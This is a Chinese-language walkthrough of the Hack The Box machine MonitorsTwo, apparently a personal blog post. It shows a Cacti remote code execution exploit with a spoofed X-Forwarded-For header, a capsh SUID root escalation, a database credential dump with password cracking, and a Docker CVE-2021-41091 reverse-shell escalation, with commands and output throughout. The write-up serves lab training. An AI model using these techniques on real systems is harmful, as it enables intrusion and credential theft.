---
tags:
  - HTB/Linux
  - HTB/Easy
---

考完CEH，久违地回来打一打靶。都有点忘了怎么操作了……

---

## 扫描

```bash
sudo nmap -n -Pn -sS -p 1-10000 --min-rate=5000 10.10.11.211
sudo nmap -v -n -Pn -sV -O -p 22,80 --script=vuln 10.10.11.211 -oA 10.10.11.211
```

*不知道为什么这次NSE脚本扫描非常非常慢，然后其实也没太多有用的信息。*

- 22
- 80


## 漏洞分析

### 80端口

访问目标网站，是个登陆界面。简单试了下单引号登陆，简单地报错了。留意到页面下方写了行 **Version 1.2.22 | (c) 2004-2023 - The Cacti Group**。

于是先尝试本地搜一波，`searchsploit cacti` 发现这个：
> Cacti v1.2.22 - Remote Command Execution (RCE) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | php/webapps/51166.py


## Initial Access

### PoC ([CVE-2022-46169](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/))

#### 方法1：ExploitDB 脚本

开搞，复制脚本到当前目录：`searchsploit -m 51166`

不过脚本运行起来一直拿不到shell……

谷歌一下倒是也有其他exp，但是就是想弄明白为什么ExploitDB这个exp不行。

然后[这篇文章](https://blog.csdn.net/qq_58869808/article/details/130482162)给了我提示，看来要理解漏洞原理啊……更改了一下exp脚本中的 `'X-Forwarded-For': f'{local_cacti_ip}'`，将其直接指定为 `'X-Forwarded-For': f'127.0.0.1'`。

运行后成功getshell：
```bash
bash-5.1$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

想升为交互shell来着不过没装python，暂时先将就着了。
```bash
bash-5.1$ which python python2 python3
which python python2 python3
bash-5.1$ 
```

#### 方法2：metasploit

谷歌的时候发现metasploit也有exp
> <https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/>

不过最开始试了试也不行，主要是两种报错：

1. 开启nc监听的话就会报错本地端口被占用（太久不用msf人都傻了，似乎本身就不用另外开启监听……）
1. 显示利用成功但是没建立连接（报错信息如下）

        [*] Command Stager progress - 100.00% done (1118/1118 bytes)
        [*] Exploit completed, but no session was created.


*后来偶然多试几次就可以了……有点迷。看来以后出现上述报错信息的话就说明利用是成功的只是得多试几次？*

```bash
meterpreter > getuid
Server username: www-data
```


## docker容器

稍微探索了一下什么都没发现，家目录没东西，很多命令如`sudo`、`ifconfig`都没有，直接`find`命令搜user.txt也找不到flag。感觉有点不同于一般easy机器的套路。

狡猾地用Meterpreter连上去收集一下信息，发现有172.19的IP——这是docker的默认网段之一。于是直接跑去根目录看看是否有 `.dockerenv` 文件，结果果然是在docker容器里啊。

*后来看了下LinPEAS是如何收集网络信息的：查看 `/etc/hosts` 文件。*

```bash
meterpreter > sysinfo
Computer     : 172.19.0.3
OS           : Debian 11.5 (Linux 5.4.0-147-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux

meterpreter > ifconfig
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0

Interface  8
============
Name         : eth0
Hardware MAC : 02:42:ac:13:00:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.19.0.3
IPv4 Netmask : 255.255.0.0


meterpreter > ls
Listing: /
==========

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100755/rwxr-xr-x  0      fil   2023-03-21 06:49:05 -0400  .dockerenv
……
```

以及根目录还有个 `entrypoint.sh` 不知道是干啥的。

*以前好像打过关于与docker的，但是完全不记得过程了……*

### SUID提权（不需要）

继续基础信息收集看看，SUID：
```bash
bash-5.1$ find / -perm -4000 -exec ls -l "{}" \; 2>/dev/null
find / -perm -4000 -exec ls -l "{}" \; 2>/dev/null
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-sr-x 1 www-data www-data 16664 May 14 22:03 /tmp/suid
-rwsr-xr-x 1 root root 30872 Oct 14  2020 /sbin/capsh
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /bin/mount
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /bin/umount
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /bin/su
```

有些不咋见到的，比如 `capsh`，在GTFBins搜搜看，发现能利用：
```bash
bash-5.1$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

拿到docker的root权限。

*然后发现自己拿到root权限也不知道要干啥……事前也没太多思路，一心想着提权都是走一步看一步，感觉这个习惯不好啊。*

### 探索DB

想起来根目录还有个 `entrypoint.sh` 文件觉得很可疑，之前由于没有root权限也没怎么看。现在看看脚本似乎是在部署DB？关注到里面有一行 
`mysql --host=db --user=root --password=root cacti -e "show tables"`。运行了一下脚本也确实显示了tables。所以想着应该可以修改这个命令探索 `cacti` 这个DB。

*后来发现这条命令甚至这个脚本其实不用root权限也能执行……因为bash命令设置了root权限的SUID，而mysql命令里直接给了账号密码去连接DB……*

```bash
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
< --password=root cacti -e "select * from user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change    show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees       policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked     failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb              on      on      on      on      on      2       1       1       1       1       on      -1-1       -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3 11       1       1       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                     on      on      on      on      1       1       1       1       1       on      -1-1               on      0       0       2135691668
```

### 密码暴破

从DB里拿到3个密码，感觉guest那个太短、格式也和另外两个差很多。最有可能是拿到marcus或者admin的密码然后SSH连接目标主机？或者进cacti的管理界面去探索主机的访问。  
稍微整理如下，方便等下给JTR暴破：
```bash
└─$ cat user_auth_fromSQL.txt 
admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
guest:43e9a4ab75570f5b
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

姑且这3个都用JTR跑一下。  
一开始直接运行 `john` 没有指定format跑了一阵觉得不对，好奇查了一下 `$2y$10$`，似乎是PHP的hash算法。继续搜搜 `john the ripper $2y$10$`，发现[这篇文章](https://security.stackexchange.com/questions/243981/for-bcrypt-why-is-jtr-so-much-faster-than-hashcat)，看来按照这样指定好些：
```bash
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt user_auth_fromSQL.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (marcus) 
```

结果先暴破出来了marcus的密码。


## flag: user

按之前的思路先试试SSH连接，成功：
```bash
└─$ ssh marcus@10.10.11.211 

……

Last login: Sun May 14 22:09:32 2023 from 10.10.14.67
marcus@monitorstwo:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorstwo:~$ ls
user.txt
marcus@monitorstwo:~$ cat user.txt 
846a…………ada0
```

看来admin就暴破不出来了，停掉john暴破开始探索目标主机。


## Privilege Escalation


### 探索

- 无sudo
- SUID无法利用
- cron
- 查看可写文件
- 查看nginx配置文件
- LinPEAS枚举

都试了试感觉不行……中间查到nginx配置文件发现虚拟主机的域名时还兴奋了一下以为这么简单，结果写入hosts文件访问后就是最开始那个web网站。

迷茫……在官方论坛看了半天，终于看到有个人说注意连接ssh时的消息…………  
我无语

于是终于找到线索：
```bash
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

### PoC ([CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091))

找到PoC就很简单了。

注意，由于PoC的脚本执行完之后会自动退出shell。所以要修改一下PoC里对应位置的命令，使其执行反向shell即可。


## flag: root

```bash
└─$ nc -lvnp 4445 
listening on [any] 4445 ...
connect to [10.xx .xx.xx] from (UNKNOWN) [10.10.11.211] 56864

bash-5.1# id
id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cd /root
cd /root
bash-5.1# ls
ls
cacti
root.txt
bash-5.1# cat root.txt
cat root.txt
dfbf…………52af
```

---

## 总结·后记

2023/05/15

虽然也有卡住的地方，但是总体来说确实不难。  
初始访问很容易就能顺着web服务的版本号去找exp，不过还是感受到了自己这个脚本小子的水平，拿着exp就想直接用，没太考虑了解漏洞原理。不过自己确实web方面较弱，代码的阅读量也少，感觉看CVE文章啃很久都不一定反应过来原来是用X-Forwarded-For等于环回IP去绕过验证。

一开始在kali搜漏洞的时候没搜出来觉得很奇怪，才想起来应该是有个数据库之类的需要更新？于是也顺便更新了ExploitDB和metasplit：

- `searchsploit -u`
- `apt update; apt install metasploit-framework`

然后就是docker容器，最初进去的时候想看IP发现没有安装`ifconfig`命令，然后搜了些替代命令如`ip a`也没有。直接开摆，要不是偶然连上Meterpreter跑了下`sysinfo`，也不知道自己会过多久才发现身处容器中……  
以及一直都是走一步想一步，由于没有好好地探索信息而被骗进兔子洞，白白在docker里拿了没用的root权限。

最后一个提权的利用实际上不难。感觉所有难点都在如何发现那条提示……SSH登陆后的信息，一直以来都是无视的啊……这台机器的创作者简直就是利用了人的这个习惯（笑）。以及如官方论坛有人说的那样，“What happens in Vegas does not always stay in Vegas”，有点意思。

总的来说，信息收集要仔细！